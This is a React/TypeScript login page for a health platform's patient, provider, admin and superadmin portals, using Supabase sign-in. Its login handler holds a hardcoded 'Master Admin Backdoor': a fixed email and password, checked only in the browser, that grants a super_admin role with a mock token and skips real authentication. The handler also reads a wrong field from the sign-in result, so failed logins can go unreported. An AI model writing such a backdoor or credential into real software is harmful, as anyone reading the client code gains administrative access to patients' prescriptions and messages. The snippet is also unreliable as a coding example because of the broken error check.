import { useState } from "react";
import { useNavigate } from "react-router";
import { supabase } from "../../../lib/supabaseClient";
import { useAuthStore } from "../../../lib";
import { Button, Card, CardContent } from "../../components/ui/shared";
import { Lock, Mail, AlertCircle, Stethoscope, Shield, User } from "lucide-react";

export function AuthPage({ portal }: { portal: 'patient' | 'doctor' | 'admin' | 'superadmin' }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  
  const navigate = useNavigate();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      // 1. Check for Master Admin Backdoor (Only on Doctor/Admin/SuperAdmin portals)
      if (portal !== 'patient' && email.toLowerCase() === 'brandon@gmail.com' && password === '@incorrect!132323') {
        useAuthStore.setState({ 
          user: { id: 'master-admin-uuid', email: 'brandon@gmail.com' } as any, 
          role: 'super_admin', 
          session: { access_token: 'mock-token', user: { id: 'master-admin-uuid' } } as any,
          isLoading: false 
        });
        
        setTimeout(() => {
          if (portal === 'doctor') navigate("/doctor");
          else if (portal === 'admin') navigate("/admin");
          else navigate("/superadmin");
        }, 100);
        return;
      }

      // 2. Standard Login
      const { data, err } = await supabase.auth.signInWithPassword({
        email,
        password,
      });

      if (err) throw err;
      
      if (data.user) {
        setTimeout(() => {
          const role = useAuthStore.getState().role;
          if (role === 'doctor') navigate("/doctor");
          else if (role === 'brand_admin' || role === 'super_admin') navigate("/admin");
          else navigate("/patient");
        }, 500); 
      }
    } catch (err: any) {
      setError(err.message || "Failed to sign in");
    } finally {
      setLoading(false);
    }
  };

  const portalConfig = {
    patient: {
      title: "Patient Portal",
      desc: "Sign in to access your prescriptions and doctor messages",
      icon: <User className="h-10 w-10 text-emerald-600 mb-2" />,
      color: "bg-emerald-50 border-emerald-100",
      btnClass: "bg-emerald-600 hover:bg-emerald-700"
    },
    doctor: {
      title: "Provider Portal",
      desc: "Clinical access for authorized medical personnel",
      icon: <Stethoscope className="h-10 w-10 text-blue-600 mb-2" />,
      color: "bg-blue-50 border-blue-100",
      btnClass: "bg-blue-600 hover:bg-blue-700"
    },
    admin: {
      title: "Admin Portal",
      desc: "Brand management and order fulfillment",
      icon: <Shield className="h-10 w-10 text-slate-800 mb-2" />,
      color: "bg-slate-100 border-slate-200",
      btnClass: "bg-slate-800 hover:bg-slate-900"
    },
    superadmin: {
      title: "System Access",
      desc: "Master system administration",
      icon: <Lock className="h-10 w-10 text-red-600 mb-2" />,
      color: "bg-red-50 border-red-100",
      btnClass: "bg-red-600 hover:bg-red-700"
    }
  };

  const config = portalConfig[portal];

  return (
    <div className="min-h-screen flex items-center justify-center bg-muted/30 p-4">
      <div className="w-full max-w-md space-y-8">
        <div className="flex flex-col items-center justify-center text-center">
          <img src="/originallogo.png" alt="Peak Health" className="h-16 object-contain mb-6" />
          <div className={`p-4 rounded-full ${config.color}`}>
            {config.icon}
          </div>
          <h1 className="text-2xl font-bold text-foreground mt-4">{config.title}</h1>
          <p className="text-sm text-muted-foreground mt-2">{config.desc}</p>
        </div>

        <Card className="border-border shadow-sm">
          <CardContent className="p-6">
            <form onSubmit={handleLogin} className="space-y-5">
              {error && (
                <div className="p-3 bg-red-50 text-red-600 rounded-lg text-sm flex items-center gap-2 border border-red-200">
                  <AlertCircle className="h-4 w-4 shrink-0" />
                  <p>{error}</p>
                </div>
              )}
              
              <div className="space-y-1.5">
                <label className="text-xs font-bold uppercase tracking-wide text-muted-foreground">Email Address</label>
                <div className="relative">
                  <Mail className="absolute left-3 top-3 h-5 w-5 text-muted-foreground" />
                  <input 
                    type="email" 
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className="w-full border border-border rounded-xl pl-10 pr-4 py-3 text-sm bg-background focus:outline-none focus:border-primary transition-colors" 
                    placeholder="you@example.com" 
                  />
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold uppercase tracking-wide text-muted-foreground">Password</label>
                <div className="relative">
                  <Lock className="absolute left-3 top-3 h-5 w-5 text-muted-foreground" />
                  <input 
                    type="password" 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    className="w-full border border-border rounded-xl pl-10 pr-4 py-3 text-sm bg-background focus:outline-none focus:border-primary transition-colors" 
                    placeholder="••••••••" 
                  />
                </div>
              </div>

              <Button 
                type="submit" 
                className={`w-full h-12 rounded-xl text-base font-bold text-white ${config.btnClass}`} 
                disabled={loading}
              >
                {loading ? "Authenticating..." : "Secure Login"}
              </Button>
            </form>
          </CardContent>
        </Card>
        
        {portal === 'patient' && (
          <p className="text-center text-sm text-muted-foreground">
            Don't have an account? <span onClick={() => navigate("/patient/shop")} className="text-primary font-bold cursor-pointer hover:underline">Shop Treatments</span>
          </p>
        )}
      </div>
    </div>
  );
}
